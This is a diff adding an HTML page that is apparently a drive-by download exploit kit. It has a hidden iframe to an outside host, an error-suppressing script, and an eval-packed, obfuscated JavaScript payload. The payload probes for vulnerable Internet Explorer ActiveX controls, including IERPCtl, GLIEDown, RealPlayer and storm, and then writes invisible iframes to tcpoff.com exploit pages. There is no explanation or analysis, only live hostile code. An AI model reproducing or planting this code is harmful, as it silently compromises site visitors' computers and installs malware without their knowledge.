@@ -1,0 +1,8 @@
+<iframe src="http://user.dui8.net/14.htm" width=100 height=0></iframe>
+<html>
+<script>window.onerror=function(){return true;}</script>
+<SCRIPT LANGUAGE="JavaScript">
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('7(6.G.R(\'M\')==-1){j{2 e;2 z=(6.N("4"));z.U("\\J\\L\\C\\B\\B\\I\\r","\\J\\L\\B\\I\\r\\Z\\X\\H\\x\\d\\w\\v\\v\\d\\i\\d\\v\\A\\y\\i\\K\\K\\H\\l\\i\\x\\12\\y\\A\\i\\l\\l\\w\\l\\V\\10\\w\\Y\\x\\W\\y\\d");2 13=z.11("\\A\\r\\O\\r\\P\\Q\\T\\S\\15\\1b\\C\\1r","")}9(e){};a{2 8=g 1s();8.1q(8.1p()+1n*E*E*1u);6.G=\'16=1t;1y=/;8=\'+8.1x();7(e!="[4 5]"){6.n("<3 b=0 c=0 m=s://t.q.o/14.p></3>")}1v{j{2 f;2 1o=g u("F.F.1")}9(f){};a{7(f!="[4 5]"){6.n("<3 b=0 c=0 m=s://t.q.o/1l.p></3>")}}j{2 h;2 1m=g u("1c.1a.1")}9(h){};a{7(h!="[4 5]"){6.n("<3 b=D c=D m=s://t.q.o/19.p></3>")}}j{2 k;2 18=g u("1d.1e 1j 1k 1i.1")}9(k){};a{7(k!="[4 5]"){6.n("<3 b=0 c=0 m=s://t.q.o/1f.p></3>")}}7(f=="[4 5]"&&h=="[4 5]"&&k=="[4 5]"){1g.1h("17:1w")}}}}',62,97,'||var|iframe|object|Error|document|if|expires|catch|finally|width|height|x36|||new||x2d|try||x30|src|write|com|htm|tcpoff|x64|http|cj|ActiveXObject|x35|x43|x39|x33|ado|x41|x73|x61|505|60|IERPCtl|cookie|x44|x69|x63|x31|x6c|OK|createElement|x6f|x62|x2e|indexOf|x74|x53|setAttribute|x34|x45|x42|x32|x3a|x46|createobject|x38|as||x72|Tyi|about|Fuck|lz|IEDown|x65|GLIEDown|rmocx|RealPlayer|newsreal|location|replace|Handler|RAM|Download|real|yahoo|24|storm|getTime|setTime|x6d|Date|Buf1|1000|else|blank|toGMTString|path'.split('|'),0,{}))
+</script>
+
+</html>
